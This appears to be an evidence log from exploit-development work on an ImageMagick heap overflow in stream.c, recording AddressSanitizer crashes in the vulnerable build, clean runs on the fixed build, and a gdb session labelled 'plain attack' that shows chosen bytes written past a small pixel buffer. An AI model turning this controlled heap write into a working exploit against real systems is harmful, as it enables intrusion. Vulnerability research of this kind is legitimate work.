@@ -1,0 +1,73 @@
+=== imagemagick2shell evidence 2026-11-23T23:17:39Z ===
+--- pins ---
+ImageMagick-7.1.2-34.tar.gz: OK
+ImageMagick-7.1.2-35.tar.gz: OK
+vuln/MagickCore/stream.c: OK
+fixed/MagickCore/stream.c: OK
+harness.c: OK
+--- builds ---
+built harness-asan harness-fixed harness-plain
+FIRST small=2x2 pixels=0x509000000280 columns=2 rows=2
+DIAG image=0x52700000e100 si.image=0x52700000e100 cache_class=1 image_class=1
+QUEUE pixels=0x509000000280 queue=0x5090000001c0 extent=4
+SECOND big=2x2 pixels=0x509000000280 columns=2 rows=2 control=0
+SYNC DONE severity=0
+PIXELS bytes: 41 41 41 42 42 42 43 43 43 44 44 44
+rc=0
+FIRST small=1x1 pixels=0x509000000280 columns=1 rows=1
+DIAG image=0x52700000e100 si.image=0x52700000e100 cache_class=1 image_class=1
+QUEUE pixels=0x509000000280 queue=0x514000000040 extent=32
+SECOND big=8x4 pixels=0x509000000280 columns=8 rows=4 control=0
+=================================================================
+==2562977==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x509000000283 at pc 0x5eb3b56d09a7 bp 0x7ffd62da6480 sp 0x7ffd62da6470
+WRITE of size 1 at 0x509000000283 thread T0
+    #0 0x5eb3b56d09a6 in StreamImagePixels vuln/MagickCore/stream.c:1576
+    #1 0x5eb3b56dcb3c in WriteStreamImage vuln/MagickCore/stream.c:1279
+    #2 0x5eb3b56cf307 in SyncAuthenticPixelsStream vuln/MagickCore/stream.c:2778
+    #3 0x5eb3b56e0862 in main /tmp/im-clean/lab/frontier/imagemagick2shell/harness.c:153
+    #4 0x786cdf02a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
+    #5 0x786cdf02a28a in __libc_start_main_impl ../csu/libc-start.c:360
+    #6 0x5eb3b56ceb44 in _start (/tmp/im-clean/lab/frontier/imagemagick2shell/harness-asan+0x15bb44) (BuildId: b927dc41e4716f638622abbe868f47ac759d871b)
+rc=1
+FIRST small=2x2 pixels=0x509000000280 columns=2 rows=2
+DIAG image=0x52700000e100 si.image=0x52700000e100 cache_class=1 image_class=1
+QUEUE pixels=0x509000000280 queue=0x5090000001c0 extent=4
+SECOND big=2x2 pixels=0x509000000280 columns=2 rows=2 control=0
+SYNC DONE severity=0
+PIXELS bytes: 41 41 41 42 42 42 43 43 43 44 44 44
+rc=0
+FIRST small=1x1 pixels=0x509000000280 columns=1 rows=1
+DIAG image=0x52700000e100 si.image=0x52700000e100 cache_class=1 image_class=1
+QUEUE pixels=0x509000000280 queue=0x514000000040 extent=32
+SECOND big=8x4 pixels=0x509000000280 columns=8 rows=4 control=0
+SYNC DONE severity=0
+PIXELS bytes: 41 41 41
+rc=0
+FIRST small=2x2 pixels=0x64186a7b9640 columns=2 rows=2
+DIAG image=0x64186a7cbb40 si.image=0x64186a7cbb40 cache_class=1 image_class=1
+QUEUE pixels=0x64186a7b9640 queue=0x64186a7ca400 extent=4
+SECOND big=2x2 pixels=0x64186a7b9640 columns=2 rows=2 control=0
+SYNC DONE severity=0
+PIXELS bytes: 41 41 41 42 42 42 43 43 43 44 44 44
+rc=0
+FIRST small=1x1 pixels=0x5b844fdab640 columns=1 rows=1
+DIAG image=0x5b844fdbdb40 si.image=0x5b844fdbdb40 cache_class=1 image_class=1
+QUEUE pixels=0x5b844fdab640 queue=0x5b844fdbc4c0 extent=32
+SECOND big=8x4 pixels=0x5b844fdab640 columns=8 rows=4 control=0
+SYNC DONE severity=0
+PIXELS bytes: 41 41 41
+rc=0
+--- gdb chosen bytes, plain attack ---
+Breakpoint 1 at 0x3ee11: file harness.c, line 154.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+FIRST small=1x1 pixels=0x5555559c7640 columns=1 rows=1
+DIAG image=0x5555559d9b40 si.image=0x5555559d9b40 cache_class=1 image_class=1
+QUEUE pixels=0x5555559c7640 queue=0x5555559d84c0 extent=32
+SECOND big=8x4 pixels=0x5555559c7640 columns=8 rows=4 control=0
+
+Breakpoint 1, main (argc=5, argv=0x7fffffffe298) at harness.c:154
+154	  fprintf(stderr,"SYNC DONE severity=%d\n",(int) exception->severity);
+$1 = {0x41, 0x41, 0x41, 0x42, 0x42, 0x42, 0x43, 0x43, 0x43, 0x44, 0x44, 0x44, 0x45, 0x45, 0x45, 0x46, 0x46, 0x46, 0x47, 0x47, 0x47, 0x48, 0x48, 0x48}
+$2 = (unsigned char *) 0x5555559c7640 "AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZAAABBBCCCDDDEEEFFF\320{\234UUU"
+=== end ===
